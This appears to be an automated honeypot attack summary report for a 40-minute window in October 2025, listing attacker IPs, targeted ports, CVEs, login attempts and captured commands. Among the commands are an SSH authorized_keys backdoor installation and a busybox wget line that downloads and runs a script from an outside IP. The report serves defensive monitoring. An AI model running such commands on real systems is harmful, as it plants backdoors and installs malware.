# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-06T02:01:41Z
**Timeframe:** 2025-10-06T01:20:01Z to 2025-10-06T02:00:01Z
**Files Used:**
- agg_log_20251006T012001Z.json
- agg_log_20251006T014001Z.json
- agg_log_20251006T020001Z.json

## Executive Summary

This report summarizes 10,918 attacks detected by the honeypot network over a 40-minute period. The most targeted services were SSH (Cowrie), email (Mailoney), and various web and IoT protocols (Honeytrap). A significant portion of the attacks originated from IP addresses 86.54.42.238, 176.65.141.117, and 80.94.95.238. Attackers attempted to exploit several vulnerabilities, including recent and older CVEs, and used a variety of shell commands to probe the systems and establish persistence.

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 3,381
- **Honeytrap:** 1,876
- **Suricata:** 1,690
- **Mailoney:** 1,693
- **Ciscoasa:** 1,453
- **Sentrypeer:** 578
- **Dionaea:** 86
- **Redishoneypot:** 47
- **H0neytr4p:** 39
- **Adbhoney:** 22
- **Tanner:** 23
- **Honeyaml:** 17
- **ElasticPot:** 5
- **Dicompot:** 3
- **ConPot:** 2
- **ssh-rsa:** 2
- **Ipphoney:** 1

### Top Attacking IPs
- 86.54.42.238
- 176.65.141.117
- 80.94.95.238
- 172.86.95.98
- 139.59.46.176
- 20.102.116.25
- 103.140.249.123
- 162.241.127.152
- 107.172.140.200
- 103.149.253.166

### Top Targeted Ports/Protocols
- 25 (SMTP)
- 5060 (SIP)
- 22 (SSH)
- 5902 (VNC)
- 5903 (VNC)
- TCP/1433 (MSSQL)
- 1433 (MSSQL)

### Most Common CVEs
- CVE-2021-44228
- CVE-2001-0414
- CVE-2024-3721
- CVE-2023-26801
- CVE-2005-4050
- CVE-2019-12263
- CVE-2019-12261
- CVE-2019-12260
- CVE-2019-12255
- CVE-2019-11500
- CVE-2021-35394
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517

### Commands Attempted by Attackers
- `uname -a`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `Enter new UNIX password:`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `top`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `cd /data/local/tmp/; busybox wget http://185.237.253.28/w.sh; sh w.sh; ...`
- `tftp; wget; /bin/busybox WSOTP`

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN NMAP -sS window 1024
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET INFO Reserved Internal IP Traffic

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- bumbling/bumbling
- yang/yang@123
- rkrai/123
- sateesh/123
- admin/168168
- supported/123
- joy/joy
- dancer/dancer
- root/---fuck_you----

### Files Uploaded/Downloaded
- wget.sh
- rondo.kqa.sh
- w.sh
- c.sh

### HTTP User-Agents
- No user-agents were logged in this period.

### SSH Clients and Servers
- No SSH client or server versions were logged in this period.

### Top Attacker AS Organizations
- No attacker AS organizations were logged in this period.

## Key Observations and Anomalies

- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...` is a clear attempt to install a persistent SSH key for backdoor access.
- The use of `busybox wget` and `curl` to download and execute shell scripts from external servers (`185.237.253.28`, `151.242.30.16`) indicates attempts to install malware or establish a botnet connection.
- A wide range of usernames and passwords were attempted, from common defaults (`admin`, `root`) to more unusual combinations. The presence of a password "---fuck_you----" suggests a non-automated, possibly manual, and hostile attack.
- The variety of CVEs targeted, from old to recent, indicates that attackers are using a broad set of tools to find unpatched systems.
